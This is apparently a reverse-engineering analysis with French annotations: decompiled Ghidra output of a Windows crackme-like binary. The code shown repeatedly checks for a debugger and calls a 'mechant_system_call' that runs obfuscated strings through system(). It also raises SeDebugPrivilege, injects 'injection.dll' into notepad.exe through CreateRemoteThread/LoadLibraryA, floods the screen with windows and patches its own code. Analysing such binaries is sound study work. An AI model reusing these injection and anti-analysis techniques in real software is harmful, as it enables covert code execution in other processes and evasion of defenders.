    *(char *)puVar2 = *(char *)puVar2 + -0x60; // retire 0x60 à chaque caractère de la chaîne
    puVar2 = (unsigned int *)((int)puVar2 + 1);
  } while (*(char *)puVar2 != '\0');
  puVar2 = &local_68;
  do
  {
    *(char *)puVar2 = *(char *)puVar2 + -0x60; // retire 0x60 à chaque caractère de la chaîne
    puVar2 = (unsigned int *)((int)puVar2 + 1);
  } while (*(char *)puVar2 != '\0');
  system((char *)&local_34);
  system((char *)&local_68);
  puVar2 = &local_34;
  cVar1 = (char)local_34;
  while (cVar1 != '\0')
  {
    *(char *)puVar2 = *(char *)puVar2 + '`';
    puVar2 = (unsigned int *)((int)puVar2 + 1);
    cVar1 = *(char *)puVar2;
  }
  puVar2 = &local_68;
  cVar1 = (char)local_68;
  while (cVar1 != '\0')
  {
    *(char *)puVar2 = *(char *)puVar2 + '`';
    puVar2 = (unsigned int *)((int)puVar2 + 1);
    cVar1 = *(char *)puVar2;
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}

unsigned int __cdecl FUN_00401290(int param_1)

{
  BOOL BVar1;
  HANDLE pvVar2;
  int iVar3;
  int *piVar4;
  int local_8;

  if (param_1 == 0)
  {
    return 1;
  }
  BVar1 = IsDebuggerPresent();
  if (BVar1 == 0)
  {
    piVar4 = &local_8;
    pvVar2 = GetCurrentProcess();
    CheckRemoteDebuggerPresent(pvVar2, piVar4);
    if (local_8 == 0)
    {
      iVar3 = 5;
      do
      {
        iVar3 = iVar3 + -1;
      } while (iVar3 != 0);
      if (param_1 == 2)
      {
        FUN_004013d0();
        return 1;
      }
      BVar1 = IsDebuggerPresent();
      if (BVar1 == 0)
      {
        piVar4 = &param_1;
        pvVar2 = GetCurrentProcess();
        CheckRemoteDebuggerPresent(pvVar2, piVar4);
        if (param_1 == 0)
        {
          return 0;
        }
      }
      mechant_system_call();
      // WARNING: Subroutine does not return
      exit(1);
    }
  }
  mechant_system_call();
  // WARNING: Subroutine does not return
  exit(1);
}

void FUN_00401370(HWND param_1, UINT param_2, WPARAM param_3, LPARAM param_4)

{
  BOOL BVar1;
  HANDLE hProcess;
  int *pbDebuggerPresent;
  int local_8;

  BVar1 = IsDebuggerPresent();
  if (BVar1 == 0)
  {
    pbDebuggerPresent = &local_8;
    hProcess = GetCurrentProcess();
    CheckRemoteDebuggerPresent(hProcess, pbDebuggerPresent);
    if (local_8 == 0)
    {
      DefWindowProcW(param_1, param_2, param_3, param_4);
      return;
    }
  }
  mechant_system_call();
  // WARNING: Subroutine does not return
  exit(1);
}

void FUN_004013d0(void)

{
  BOOL BVar1;
  HANDLE pvVar2;
  int iVar3;
  unsigned int *lpWindowName;
  HWND hWnd;
  uint uVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  int *piVar8;
  int iStack_12c;
  int iStack_128;
  uint local_124;
  HWAVEOUT pHStack_120;
  HINSTANCE pHStack_11c;
  HMODULE pHStack_118;
  int iStack_114;
  WNDCLASSW WStack_110;
  basic_streambuf<> *pbStack_e8;
  unsigned char **appuStack_e4[4];
  int iStack_d4;
  unsigned char *puStack_d0;
  unsigned char **ppuStack_cc;
  basic_streambuf<> abStack_c8[12];
  void **ppvStack_bc;
  unsigned int uStack_90;
  uint uStack_8c;
  basic_ios<> abStack_84[4];
  unsigned char *apuStack_80[17];
  void *pvStack_3c;
  unsigned int uStack_2c;
  uint uStack_28;
  uint uStack_20;
  uint local_1c;
  void *pvStack_18;
  void *local_14;
  unsigned int uStack_10;
  unsigned int uStack_c;

  uStack_c = 0xffffffff;
  uStack_10 = &LAB_00403e9e;
  local_14 = ExceptionList;
  local_1c = DAT_00406018 ^ (uint)&iStack_12c;
  ExceptionList = &local_14;
  local_124 = 0;
  SetConsoleCtrlHandler(FUN_00401290, 1);
  pHStack_11c = (HINSTANCE)GetSystemMetrics(0);
  iStack_114 = GetSystemMetrics(1);
  BVar1 = IsDebuggerPresent();
  if (BVar1 == 0)
  {
    piVar8 = &iStack_128;
    pvVar2 = GetCurrentProcess();
    CheckRemoteDebuggerPresent(pvVar2, piVar8);
    if (iStack_128 == 0)
    {
      iVar3 = 0;
      uVar4 = 1;
      iVar7 = 5;
      do
      {
        uVar4 = (uVar4 - 3) * (iVar3 + 1);
        uVar5 = uVar4 & 0x80000003;
        if ((int)uVar5 < 0)
        {
          uVar5 = (uVar5 - 1 | 0xfffffffc) + 1;
        }
        iVar3 = iVar3 + (-(uint)(uVar5 != 0) & 0xfffffffb) + 7;
        iVar6 = 5;
        do
        {
          iVar6 = iVar6 + -1;
          iVar3 = iVar3 * 2 + 1;
        } while (iVar6 != 0);
        iVar7 = iVar7 + -1;
      } while (iVar7 != 0);
      waveOutOpen(&pHStack_120, 0xffffffff, (LPCWAVEFORMATEX)0x0, 0, 0, 1);
      waveOutSetVolume(pHStack_120, 0xffffffff);
      waveOutClose(pHStack_120);
      pHStack_118 = GetModuleHandleW((LPCWSTR)0x0);
      WStack_110.cbClsExtra = 0;
      WStack_110.cbWndExtra = 0;
      WStack_110.hIcon = (HICON)0x0;
      WStack_110.hCursor = (HCURSOR)0x0;
      WStack_110.lpszMenuName = (LPCWSTR)0x0;
      WStack_110.style = 0;
      WStack_110.lpfnWndProc = FUN_00401370;
      WStack_110.lpszClassName = L"MyWindowClass";
      WStack_110.hbrBackground = (HBRUSH)0x6;
      WStack_110.hInstance = pHStack_118;
      RegisterClassW(&WStack_110);
      BVar1 = IsDebuggerPresent();
      if (BVar1 == 0)
      {
        piVar8 = &iStack_128;
        pvVar2 = GetCurrentProcess();
        CheckRemoteDebuggerPresent(pvVar2, piVar8);
        if (iStack_128 == 0)
        {
          appuStack_e4[0] = apuStack_80;
          pbStack_e8 = abStack_c8;
          iVar7 = 100;
          iStack_128 = 1000000000;
          do
          {
            MessageBeep(0x10);
            appuStack_e4[1] = &PTR_004043e0;
            puStack_d0 = &DAT_004043e8;
            std::basic_ios<>::basic_ios<>((basic_ios<> *)apuStack_80);
            uStack_c = 0;
            local_124 = local_124 | 1;
            std::basic_iostream<>::basic_iostream<>((basic_iostream<> *)(appuStack_e4 + 1), abStack_c8);
            uStack_10 = (unsigned char *)0x1;
            *(unsigned char ***)((int)appuStack_e4 + (int)appuStack_e4[0][1]) =
                std::basic_stringstream<>::vftable;
            std::basic_streambuf<>::basic_streambuf<>((basic_streambuf<> *)&ppuStack_cc);
            ppuStack_cc = std::basic_stringbuf<>::vftable;
            uStack_90 = 0;
            uStack_8c = 0;
            uStack_10 = (unsigned char *)0x3;
            FUN_00403080(&iStack_d4);
            lpWindowName = (unsigned int *)FUN_00402260();
            if (7 < (uint)lpWindowName[5])
            {
              lpWindowName = (unsigned int *)*lpWindowName;
            }
            hWnd = CreateWindowExW(0, L"MyWindowClass", (LPCWSTR)lpWindowName, 0xcf0000,
                                   iVar7 % (int)pHStack_120, iVar7 % (int)pHStack_118, 400, 0x96,
                                   (HWND)0x0, (HMENU)0x0, pHStack_11c, (LPVOID)0x0);
            if (7 < uStack_28)
            {
              operator_delete(pvStack_3c);
            }
            uStack_28 = 7;
            uStack_2c = 0;
            pvStack_3c = (void *)((uint)pvStack_3c & 0xffff0000);
            ShowWindow(hWnd, 5);
            *(unsigned char ***)((int)appuStack_e4 + (int)appuStack_e4[0][1]) =
                std::basic_stringstream<>::vftable;
            ppuStack_cc = std::basic_stringbuf<>::vftable;
            uStack_10._0_1_ = 5;
            uStack_10._1_3_ = 0;
            if ((uStack_8c & 1) != 0)
            {
              operator_delete(*ppvStack_bc);
            }
            std::basic_streambuf<>::setg((basic_streambuf<> *)&ppuStack_cc, (wchar_t *)0x0, (wchar_t *)0x0,
                                         (wchar_t *)0x0);
            std::basic_streambuf<>::setp((basic_streambuf<> *)&ppuStack_cc, (wchar_t *)0x0, (wchar_t *)0x0);
            uStack_8c = uStack_8c & 0xfffffffe;
            uStack_90 = 0;
            uStack_10 = (unsigned char *)CONCAT31(uStack_10._1_3_, 4);
            std::basic_streambuf<>::~basic_streambuf<>((basic_streambuf<> *)&ppuStack_cc);
            uStack_10 = (unsigned char *)0xffffffff;
            std::basic_iostream<>::~basic_iostream<>((basic_iostream<> *)&ppuStack_cc);
            std::basic_ios<>::~basic_ios<>(abStack_84);
            iVar7 = iVar7 + 0x28;
            iStack_12c = iStack_12c + -1;
          } while (iStack_12c != 0);
          ExceptionList = pvStack_18;
          ___security_check_cookie_4(uStack_20 ^ (uint)&stack0xfffffed0);
          return;
        }
      }
      mechant_system_call();
      // WARNING: Subroutine does not return
      exit(1);
    }
  }
  mechant_system_call();
  // WARNING: Subroutine does not return
  exit(1);
}

void __fastcall FUN_00401790(int *param_1)

{
  void *local_10;
  unsigned char *puStack_c;
  unsigned int local_8;

  puStack_c = &LAB_00403d8c;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *(unsigned char ***)(*(int *)(*param_1 + 4) + -0x60 + (int)(param_1 + 0x18)) =
      std::basic_stringstream<>::vftable;
  local_8 = 0;
  FUN_00402280(param_1 + 6);
  local_8 = 0xffffffff;
  std::basic_iostream<>::~basic_iostream<>((basic_iostream<> *)(param_1 + 6));
  std::basic_ios<>::~basic_ios<>((basic_ios<> *)(param_1 + 0x18));
  ExceptionList = local_10;
  return;
}

void __cdecl FUN_00401800(HANDLE param_1)

{
  BOOL BVar1;
  HANDLE pvVar2;
  unsigned int extraout_ECX;
  unsigned int extraout_EDX;
  ulonglong uVar3;
  uint *pbDebuggerPresent;
  HANDLE *pbDebuggerPresent_00;
  _LUID local_2c;
  uint local_24;
  HANDLE local_20;
  _TOKEN_PRIVILEGES local_1c;
  uint local_c;

  local_c = DAT_00406018 ^ (uint)&stack0xfffffffc;
  local_20 = param_1;
  DAT_004065d8 = 0;
  BVar1 = IsDebuggerPresent();
  if (BVar1 == 0)
  {
    pbDebuggerPresent = &local_24;
    pvVar2 = GetCurrentProcess();
    CheckRemoteDebuggerPresent(pvVar2, (PBOOL)pbDebuggerPresent);
    if (local_24 == 0)
    {
      BVar1 = LookupPrivilegeValueW((LPCWSTR)0x0, L"SeDebugPrivilege", &local_2c);
      if (BVar1 != 0)
      {
        local_1c.PrivilegeCount = 1;
        local_24 = DAT_004065d8;
        if ((int)DAT_004065d8 < 1000000)
        {
          local_24 = 1000000;
        }
        local_24 = local_24 ^ 0x17;
        uVar3 = FUN_00403c50(extraout_ECX, extraout_EDX);
        DAT_004065d8 = (uint)uVar3;
        local_1c.Privileges[0].Luid.LowPart = local_2c.LowPart;
        local_1c.Privileges[0].Luid.HighPart = local_2c.HighPart;
        local_1c.Privileges[0].Attributes = 2;
        BVar1 = AdjustTokenPrivileges(local_20, 0, &local_1c, 0, (PTOKEN_PRIVILEGES)0x0, (PDWORD)0x0);
        if (BVar1 != 0)
        {
          GetLastError();
        }
      }
      DAT_004065d8 = 5;
      BVar1 = IsDebuggerPresent();
      if (BVar1 == 0)
      {
        pbDebuggerPresent_00 = &local_20;
        pvVar2 = GetCurrentProcess();
        CheckRemoteDebuggerPresent(pvVar2, (PBOOL)pbDebuggerPresent_00);
        if (local_20 == (HANDLE)0x0)
        {
          ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
          return;
        }
      }
      mechant_system_call();
      // WARNING: Subroutine does not return
      exit(1);
    }
  }
  mechant_system_call();
  // WARNING: Subroutine does not return
  exit(1);
}

void FUN_00401920(void)

{
  HANDLE pvVar1;
  BOOL BVar2;
  uint uVar3;
  int iVar4;
  unsigned int extraout_ECX;
  unsigned int extraout_EDX;
  ulonglong uVar5;
  HANDLE *ppvVar6;
  size_t local_350;
  HANDLE local_34c;
  HANDLE local_348;
  unsigned int local_344[2];
  DWORD local_33c;
  wchar_t local_320[262];
  char local_114;
  unsigned char local_113[267];
  uint local_8;

  local_8 = DAT_00406018 ^ (uint)&stack0xfffffffc;
  pvVar1 = GetCurrentProcess();
  BVar2 = OpenProcessToken(pvVar1, 0x20, &local_34c);
  if (BVar2 != 0)
  {
    FUN_00401800(local_34c);
    CloseHandle(local_34c);
  }
  BVar2 = IsDebuggerPresent();
  if (BVar2 == 0)
  {
    ppvVar6 = &local_348;
    pvVar1 = GetCurrentProcess();
    CheckRemoteDebuggerPresent(pvVar1, (PBOOL)ppvVar6);
    if (local_348 == (HANDLE)0x0)
    {
      local_344[0] = 0x22c;
      uVar3 = DAT_004065d8;
      if ((int)DAT_004065d8 < 1000000)
      {
        uVar3 = 1000000;
      }
      local_348 = (HANDLE)(uVar3 ^ 0x38);
      uVar5 = FUN_00403c50(extraout_ECX, extraout_EDX);
      DAT_004065d8 = (uint)uVar5;
      local_114 = '\0';
      memset(local_113, 0, 0x103);
      local_350 = 0;
      BVar2 = IsDebuggerPresent();
      if (BVar2 == 0)
      {
        ppvVar6 = &local_348;
        pvVar1 = GetCurrentProcess();
        CheckRemoteDebuggerPresent(pvVar1, (PBOOL)ppvVar6);
        if (local_348 == (HANDLE)0x0)
        {
          pvVar1 = (HANDLE)CreateToolhelp32Snapshot(2, 0);
          local_348 = pvVar1;
          iVar4 = Process32FirstW(pvVar1, local_344);
          if (iVar4 != 0)
          {
            iVar4 = Process32NextW(pvVar1, local_344);
            while (iVar4 != 0)
            {
              DAT_004065d8 = 1;
              wcstombs_s(&local_350, &local_114, 0x104, local_320, 0x104);
              iVar4 = _stricmp(&local_114, "notepad.exe");
              if (iVar4 == 0)
              {
                pvVar1 = OpenProcess(0x1fffff, 0, local_33c);
                if (pvVar1 != (HANDLE)0x0)
                {
                  CloseHandle(local_348);
                  DAT_004065d8 = 0x13;
                  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
                  return;
                }
                GetLastError();
              }
              iVar4 = 100;
              do
              {
                iVar4 = iVar4 + -1;
                DAT_004065d8 = 0xd;
              } while (iVar4 != 0);
              iVar4 = Process32NextW(local_348, local_344);
              pvVar1 = local_348;
            }
          }
          CloseHandle(pvVar1);
          ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
          return;
        }
      }
      mechant_system_call();
      // WARNING: Subroutine does not return
      exit(1);
    }
  }
  mechant_system_call();
  // WARNING: Subroutine does not return
  exit(1);
}

DWORD FUN_00401b70(void)

{
  BOOL BVar1;
  HANDLE pvVar2;
  char *_Dst;
  uint uVar3;
  unsigned int extraout_ECX;
  unsigned int extraout_ECX_00;
  unsigned int extraout_EDX;
  unsigned long long uVar4;
  ulonglong uVar5;
  uint *puVar6;
  unsigned char local_64[72];
  _PROCESS_INFORMATION local_1c;
  LPWSTR local_c;
  uint local_8;

  BVar1 = IsDebuggerPresent();
  if (BVar1 == 0)
  {
    puVar6 = &local_8;
    pvVar2 = GetCurrentProcess();
    CheckRemoteDebuggerPresent(pvVar2, (PBOOL)puVar6);
    if (local_8 == 0)
    {
      uVar4 = FUN_004032cd(0x20);
      _Dst = (char *)uVar4;
      local_8 = DAT_004065d8;
      if ((int)DAT_004065d8 < 1000000)
      {
        local_8 = 1000000;
      }
      local_8 = local_8 ^ 0x43;
      uVar5 = FUN_00403c50(extraout_ECX, (int)((ulonglong)uVar4 >> 0x20));
      DAT_004065d8 = (uint)uVar5;
      strcpy_s(_Dst, 0x20, "C:\\WINDOWS\\System32\\");
      strcat_s(_Dst, 0x20, "notepad.exe");
      uVar3 = MultiByteToWideChar(0xfde9, 0, _Dst, -1, (LPWSTR)0x0, 0);
      local_c = (LPWSTR)FUN_004032cd(-(uint)((int)((ulonglong)uVar3 * 2 >> 0x20) != 0) |
                                     (uint)((ulonglong)uVar3 * 2));
      MultiByteToWideChar(0xfde9, 0, _Dst, -1, local_c, uVar3);
      local_64._0_4_ = 0x44;
      memset(local_64 + 4, 0, 0x40);
      BVar1 = IsDebuggerPresent();
      if (BVar1 == 0)
      {
        puVar6 = &local_8;
        pvVar2 = GetCurrentProcess();
        CheckRemoteDebuggerPresent(pvVar2, (PBOOL)puVar6);
        if (local_8 == 0)
        {
          BVar1 = CreateProcessW(local_c, (LPWSTR)0x0, (LPSECURITY_ATTRIBUTES)0x0,
                                 (LPSECURITY_ATTRIBUTES)0x0, 0, 0, (LPVOID)0x0, (LPCWSTR)0x0,
                                 (LPSTARTUPINFOW)local_64, &local_1c);
          if (BVar1 != 0)
          {
            uVar3 = DAT_004065d8;
            if ((int)DAT_004065d8 < 1000000)
            {
              uVar3 = 1000000;
            }
            local_c = (LPWSTR)(uVar3 ^ 0x24);
            uVar5 = FUN_00403c50(extraout_ECX_00, extraout_EDX);
            DAT_004065d8 = (uint)uVar5;
            CloseHandle(local_1c.hProcess);
            CloseHandle(local_1c.hThread);
            DAT_004065d8 = 0;
            return local_1c.dwProcessId;
          }
          return 0;
        }
      }
      mechant_system_call();
      // WARNING: Subroutine does not return
      exit(1);
    }
  }
  mechant_system_call();
  // WARNING: Subroutine does not return
  exit(1);
}

void FUN_00401d10(void)

{
  char cVar1;
  BOOL BVar2;
  HANDLE pvVar3;
  uint cbMultiByte;
  LPSTR lpMultiByteStr;
  DWORD dwProcessId;
  LPSTR pCVar4;
  LPVOID lpBaseAddress;
  HMODULE hModule;
  LPTHREAD_START_ROUTINE lpStartAddress;
  int iVar5;
  unsigned int extraout_ECX;
  unsigned int extraout_EDX;
  ulonglong uVar6;
  uint *puVar7;
  SIZE_T local_62c;
  uint local_628;
  WCHAR local_624[260];
  WCHAR local_41c[260];
  wchar_t local_214[262];
  uint local_8;

  local_8 = DAT_00406018 ^ (uint)&stack0xfffffffc;
  GetModuleFileNameW((HMODULE)0x0, local_624, 0x104);
  BVar2 = IsDebuggerPresent();
  if (BVar2 == 0)
  {
    puVar7 = &local_628;
    pvVar3 = GetCurrentProcess();
    CheckRemoteDebuggerPresent(pvVar3, (PBOOL)puVar7);
    if (local_628 == 0)
    {
      wcscpy_s(local_214, 0x104, local_624);
      PathRemoveFileSpecW(local_214);
      PathCombineW(local_41c, local_214, L"injection.dll");
      cbMultiByte = WideCharToMultiByte(0xfde9, 0, local_41c, -1, (LPSTR)0x0, 0, (LPCSTR)0x0, (LPBOOL)0x0);
      local_628 = DAT_004065d8;
      if ((int)DAT_004065d8 < 1000000)
      {
        local_628 = 1000000;
      }
      local_628 = local_628 ^ 0x4e;
      uVar6 = FUN_00403c50(extraout_ECX, extraout_EDX);
      DAT_004065d8 = (uint)uVar6;
      lpMultiByteStr = (LPSTR)FUN_004032cd(cbMultiByte);
      WideCharToMultiByte(0xfde9, 0, local_41c, -1, lpMultiByteStr, cbMultiByte, (LPCSTR)0x0, (LPBOOL)0x0);
      dwProcessId = FUN_00401920();
      BVar2 = IsDebuggerPresent();
      if (BVar2 == 0)
      {
        puVar7 = &local_628;
        pvVar3 = GetCurrentProcess();
        CheckRemoteDebuggerPresent(pvVar3, (PBOOL)puVar7);
        if (local_628 == 0)
        {
          if (dwProcessId == 0)
          {
            dwProcessId = FUN_00401b70();
            DAT_004065d8 = 0;
          }
          pvVar3 = OpenProcess(0x1fffff, 0, dwProcessId);
          pCVar4 = lpMultiByteStr;
          do
          {
            cVar1 = *pCVar4;
            pCVar4 = pCVar4 + 1;
          } while (cVar1 != '\0');
          lpBaseAddress =
              VirtualAllocEx(pvVar3, (LPVOID)0x0, (SIZE_T)(pCVar4 + (1 - (int)(lpMultiByteStr + 1))),
                             0x3000, 4);
          pCVar4 = lpMultiByteStr;
          do
          {
            cVar1 = *pCVar4;
            pCVar4 = pCVar4 + 1;
          } while (cVar1 != '\0');
          WriteProcessMemory(pvVar3, lpBaseAddress, lpMultiByteStr,
                             (SIZE_T)(pCVar4 + (1 - (int)(lpMultiByteStr + 1))), &local_62c);
          hModule = GetModuleHandleW(L"Kernel32");
          lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "LoadLibraryA");
          CreateRemoteThread(pvVar3, (LPSECURITY_ATTRIBUTES)0x0, 0, lpStartAddress, lpBaseAddress, 0,
                             (LPDWORD)0x0);
          iVar5 = 100;
          do
          {
            iVar5 = iVar5 + -1;
            DAT_004065d8 = 0;
          } while (iVar5 != 0);
          WaitForSingleObject(pvVar3, 12000);
          CloseHandle(pvVar3);
          ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
          return;
        }
      }
      mechant_system_call();
      // WARNING: Subroutine does not return
      exit(1);
    }
  }
  mechant_system_call();
  // WARNING: Subroutine does not return
  exit(1);
}

/**
 * 
 * Attention ! Cette fonction est auto-modifiée dans la fonction main ! Les 5 premiers octets sont modifiés
*/
void FUN_00401f30(void)

{
  BOOL BVar1;
  HANDLE hProcess;
  int *pbDebuggerPresent;
  int local_8;

  BVar1 = IsDebuggerPresent();
  if (BVar1 == 0)
  {
    pbDebuggerPresent = &local_8;
    hProcess = GetCurrentProcess();
    CheckRemoteDebuggerPresent(hProcess, pbDebuggerPresent);
    if (local_8 == 0)
    {
      printf(&DAT_00404328);
      return;
    }
  }
  mechant_system_call();
  // WARNING: Subroutine does not return
  exit(1);
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

/**
C'est peut-être la fonction principale, celle qui affiche et qui (ou pas) calcule la clé !!
Après analyse, c'est le main !

*/
void __cdecl main(int param_1)

{
  byte bVar1;
  bool bVar2;
  BOOL BVar3;
  HANDLE pvVar4;
  int iVar5;
  unsigned int *puVar6;
  unsigned int *puVar7;
  int iVar8;
  code *pcVar9;
  DWORD *pDVar10;
  int *piVar11;
  unsigned char auStack_3c[4];
  DWORD DStack_38;
  unsigned int uStack_34;
  unsigned int uStack_30;
  unsigned char uStack_2c;
  unsigned char uStack_2b;
  int iStack_28;
  unsigned int uStack_24;
  unsigned int uStack_20;
  unsigned short uStack_1c;
  unsigned char uStack_1a;
  unsigned int uStack_18;
  unsigned int uStack_14;
  unsigned short uStack_10;
  unsigned char uStack_e;
  uint local_c;

  local_c = DAT_00406018 ^ (uint)auStack_3c;
  BVar3 = IsDebuggerPresent();
  pcVar9 = GetCurrentProcess_exref;
  if (BVar3 != 0)
  {
  LAB_00401fc6:
    mechant_system_call();
    // WARNING: Subroutine does not return
    exit(1);
  }
  pDVar10 = &DStack_38;
  pvVar4 = GetCurrentProcess();
  CheckRemoteDebuggerPresent(pvVar4, (PBOOL)pDVar10);
  if (DStack_38 != 0)
    goto LAB_00401fc6;
  if (param_1 != 2)
  {
    FUN_00401d10();
    FUN_004013d0();
    ___security_check_cookie_4(local_c ^ (uint)auStack_3c);
    return;
  }
  bVar2 = FUN_004010f0();
  if (bVar2)
    goto LAB_0040220e;
  FUN_00401d10();
  FUN_004013d0();
  BVar3 = IsDebuggerPresent();
  if (BVar3 == 0)
  {
    pDVar10 = &DStack_38;
    pvVar4 = GetCurrentProcess();
    CheckRemoteDebuggerPresent(pvVar4, (PBOOL)pDVar10);
    if (DStack_38 != 0)
      goto LAB_00402034;
  }
  else
  {
  LAB_00402034:
    mechant_system_call();
  }
  uStack_24 = 0x50415d5e;
  uStack_20 = 0x4352476b;
  uStack_1c = 0x456f;
  uStack_1a = 0x2a;
  uStack_18 = 0x52435f5c;
  uStack_14 = 0x41504569;
  uStack_10 = 0x476d;
  uStack_e = 0x28;
  iVar5 = 0;
  DAT_004065d8 = 1;
  // 7a6e7774026d476b7a6f43 pour ustack_18, mais je suis pas sûr de l'ordre
  //
  do
  {
    *(byte *)((int)&uStack_24 + iVar5) = *(byte *)((int)&uStack_24 + iVar5) ^ 0x2a;
    *(byte *)((int)&uStack_18 + iVar5) = *(byte *)((int)&uStack_18 + iVar5) ^ 0x28;
    iVar5 = iVar5 + 1;
  } while (iVar5 < 0xb);
  BVar3 = IsDebuggerPresent();
  if (BVar3 == 0)
  {
    pDVar10 = &DStack_38;
    pvVar4 = GetCurrentProcess();
    CheckRemoteDebuggerPresent(pvVar4, (PBOOL)pDVar10);
    if (DStack_38 != 0)
      goto LAB_004020b4;
  }
  else
  {
  LAB_004020b4:
    mechant_system_call();
  }
  puVar7 = &uStack_18;
  puVar6 = &uStack_24;
  do
  {
    bVar1 = *(byte *)puVar6;
    bVar2 = bVar1 < *(byte *)puVar7;
    if (bVar1 != *(byte *)puVar7)
    {
    LAB_004020e1:
      iVar5 = (1 - (uint)bVar2) - (uint)(bVar2 != 0);
      goto LAB_004020e6;
    }
    if (bVar1 == 0)
      break;
    bVar1 = *(byte *)((int)puVar6 + 1);
    bVar2 = bVar1 < *(byte *)((int)puVar7 + 1);
    if (bVar1 != *(byte *)((int)puVar7 + 1))
      goto LAB_004020e1;
    puVar6 = (unsigned int *)((int)puVar6 + 2);
    puVar7 = (unsigned int *)((int)puVar7 + 2);
  } while (bVar1 != 0);
  iVar5 = 0;
LAB_004020e6:
  if (iVar5 == 0)
  {
    printf("%s\n", &uStack_24);
    Sleep(5);
    mechant_system_call();
    VirtualProtect(FUN_00401f30, 5, 0x40, &DStack_38);
    uStack_30 = 0xcc;
    uStack_2c = 0;
    uStack_2b = 0;
    uRam00401f38 = 0;
    uStack_34 = 0xccccd6ff;
    // WARNING: Read-only address (ram,0x00401f30) is written
    _FUN_00401f30 = 0xccccd6ff;
    // WARNING: Read-only address (ram,0x00401f34) is written
    uRam00401f34 = 0xcc;
    // WARNING: Read-only address (ram,0x00401f38) is written
    VirtualProtect(FUN_00401f30, 5, DStack_38, &DStack_38);
    BVar3 = IsDebuggerPresent();
    if (BVar3 != 0)
    {
    LAB_00402194:
      mechant_system_call();
      // WARNING: Subroutine does not return
      exit(1);
    }
    piVar11 = &iStack_28;
    pvVar4 = GetCurrentProcess();
    CheckRemoteDebuggerPresent(pvVar4, piVar11);
    if (iStack_28 != 0)
      goto LAB_00402194;
    printf(&DAT_00404328);
    pcVar9 = GetCurrentProcess_exref;
  }
  BVar3 = IsDebuggerPresent();
  if (BVar3 == 0)
  {
    piVar11 = &iStack_28;
    pvVar4 = (HANDLE)(*pcVar9)();
    CheckRemoteDebuggerPresent(pvVar4, piVar11);
    if (iStack_28 != 0)
      goto LAB_004021d5;
  }
  else
  {
  LAB_004021d5:
    mechant_system_call();
  }
  iVar5 = 0;
  DAT_004065d8 = 1;
  do
  {
    *(byte *)((int)&uStack_24 + iVar5) = *(byte *)((int)&uStack_24 + iVar5) ^ 0x2a;
    iVar8 = 100;
    do
    {
      iVar8 = iVar8 + -1;
    } while (iVar8 != 0);
    *(byte *)((int)&uStack_18 + iVar5) = *(byte *)((int)&uStack_18 + iVar5) ^ 0x28;
    iVar5 = iVar5 + 1;
  } while (iVar5 < 0xb);
LAB_0040220e:
  ___security_check_cookie_4(local_c ^ (uint)auStack_3c);
  return;
}

void FUN_00402230(void)

{
  void **unaff_ESI;

  if ((void *)0x7 < unaff_ESI[5])
  {
    operator_delete(*unaff_ESI);
  }
  unaff_ESI[5] = (void *)0x7;
  unaff_ESI[4] = (void *)0x0;
  *(unsigned short *)unaff_ESI = 0;
  return;
}

void FUN_00402260(void)

{
  int in_EAX;
  void *unaff_ESI;

  FUN_00402b40(unaff_ESI, in_EAX + 0x18);
  return;
}

void __fastcall FUN_00402280(unsigned int *param_1)

{
  *param_1 = std::basic_stringbuf<>::vftable;
  if ((*(byte *)(param_1 + 0x10) & 1) != 0)
  {
    operator_delete(*(void **)param_1[4]);
  }
  *(unsigned int *)param_1[4] = 0;
  *(unsigned int *)param_1[8] = 0;
  *(unsigned int *)param_1[0xc] = 0;
  *(unsigned int *)param_1[5] = 0;
  *(unsigned int *)param_1[9] = 0;
  *(unsigned int *)param_1[0xd] = 0;
  param_1[0x10] = param_1[0x10] & 0xfffffffe;
  param_1[0xf] = 0;
  // WARNING: Could not recover jumptable at 0x004022e2. Too many branches
  // WARNING: Treating indirect jump as call
  std::basic_streambuf<>::~basic_streambuf<>((basic_streambuf<> *)param_1);
  return;
}

wchar_t __thiscall FUN_004022f0(void *this, wchar_t param_1)

{
  void *pvVar1;
  int iVar2;
  void *_Src;
  wchar_t *pwVar3;
  uint uVar4;
  void *_Dst;
  uint uVar5;

  if ((*(byte *)((int)this + 0x40) & 8) != 0)
  {
    uVar5 = **(uint **)((int)this + 0x24);
    if ((uVar5 != 0) && (uVar4 = *(uint *)((int)this + 0x3c), uVar5 < uVar4))
    {
      iVar2 = **(int **)((int)this + 0x34);
      **(uint **)((int)this + 0x24) = uVar4;
      **(int **)((int)this + 0x34) = (int)((uVar5 + iVar2 * 2) - uVar4) >> 1;
    }
  }
  if (param_1 == L'\xffff')
  {
    return L'\0';
  }
  uVar5 = **(uint **)((int)this + 0x24);
  if ((uVar5 != 0) && (uVar5 < uVar5 + **(int **)((int)this + 0x34) * 2))
  {
    pwVar3 = std::basic_streambuf<>::_Pninc((basic_streambuf<> *)this);
    *pwVar3 = param_1;
    return param_1;
  }
  if ((*(byte *)((int)this + 0x40) & 2) != 0)
  {
    return L'\xffff';
  }
  if (uVar5 == 0)
  {
    uVar5 = 0;
  }
  else
  {
    uVar5 = (int)((**(int **)((int)this + 0x34) * 2 - **(int **)((int)this + 0x10)) + uVar5) >> 1;
  }
  uVar4 = uVar5 >> 1;
  if (uVar4 < 0x20)
  {
    uVar4 = 0x20;
  }
  else if (uVar4 == 0)
  {
    return L'\xffff';
  }
  do
  {
    if (uVar5 <= 0x7fffffff - uVar4)
      break;
    uVar4 = uVar4 >> 1;
  } while (uVar4 != 0);
  if (uVar4 == 0)
  {
    return L'\xffff';
  }
  uVar4 = uVar4 + uVar5;
  _Dst = FUN_00402ae0(uVar4);
  _Src = **(void ***)((int)this + 0x10);
  if ((uVar5 == 0) || (memcpy(_Dst, _Src, uVar5 * 2), uVar5 == 0))
  {
    *(void **)((int)this + 0x3c) = _Dst;
    **(void ***)((int)this + 0x14) = _Dst;
    **(void ***)((int)this + 0x24) = _Dst;
    **(int **)((int)this + 0x34) = (int)(uVar4 * 2) >> 1;
    if ((*(byte *)((int)this + 0x40) & 4) == 0)
    {
      **(void ***)((int)this + 0x10) = _Dst;
